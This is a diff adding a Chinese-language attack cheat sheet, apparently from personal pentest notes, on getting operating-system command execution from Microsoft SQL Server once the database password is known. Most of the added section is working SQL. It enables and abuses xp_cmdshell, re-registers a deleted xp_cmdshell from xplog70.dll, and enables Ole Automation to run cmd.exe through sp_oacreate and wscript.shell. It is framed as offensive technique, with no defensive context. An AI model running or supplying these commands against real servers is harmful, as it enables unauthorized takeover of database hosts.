@@ -109,7 +109,7 @@ updatexml()类似extractvalue() 方法
 
 
 
-
+## 
 
 
 
@@ -123,3 +123,97 @@ phpstudy 就是...\PhpStudy20180211\PHPTutorial\WWW\
 xammp 就是...\xampp\htdocs
 ```
 
+# 攻击Mssql数据库命令执行总结
+
+## xp_cmdshell利用
+
+**前提条件：**
+
+- Mssql数据库服务未降权
+- 已获取到数据库密码
+
+xp_cmdshell是Sql Server中的一个组件，我们可以用它来执行系统命令
+
+### **判断xp_cmdshell状态**
+
+我们可以在master.dbo.sysobjects中查看xp_cmdshell状态
+
+```mssql
+select * from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'
+```
+
+只用判断存在，利用count(*)即可。
+
+```mssql
+select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'
+```
+
+存在即返回1
+
+### **启用xp_cmdshell**
+
+我们可以利用EXEC启用xp_cmdshell
+
+```mssql
+EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
+```
+
+### **利用xp_cmdshell执行命令**
+
+通过xp_cmdshell执行系统命令指令如下
+
+```mssql
+exec master..xp_cmdshell 'whoami'
+```
+
+### **恢复被删除的xp_cmdshell**
+
+我们可以利用xplog70.dll恢复被删除的xp_cmdshell
+
+```mssql
+Exec master.dbo.sp_addextendedproc 'xp_cmdshell','D:\\xplog70.dll'
+```
+
+## **COM组件利用**
+
+前提条件：
+
+- Mssql数据库服务未降权
+- 已获取到数据库密码
+
+我们可以借助Sql Server中的COM组件SP_OACREATE来执行系统命令。
+
+### **判断SP_OACREATE状态**
+
+我们可以在master.dbo.sysobjects中查看SP_OACREATE状态
+
+```mssql
+select * from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'
+```
+
+只用判断存在，利用count(*)即可
+
+```mssql
+select count(*) from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'
+```
+
+存在即返回1
+
+### **启用SP_OACREATE**
+
+利用EXEC启用SP_OACREATE
+
+```mssql
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE WITH OVERRIDE;
+EXEC sp_configure 'Ole Automation Procedures', 1;
+RECONFIGURE WITH OVERRIDE;
+```
+
+### **利用SP_OACREATE执行命令**
+
+通过SP_OACREATE执行系统命令指令如下
+
+```mssql
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami >c:\\1.txt'
+```
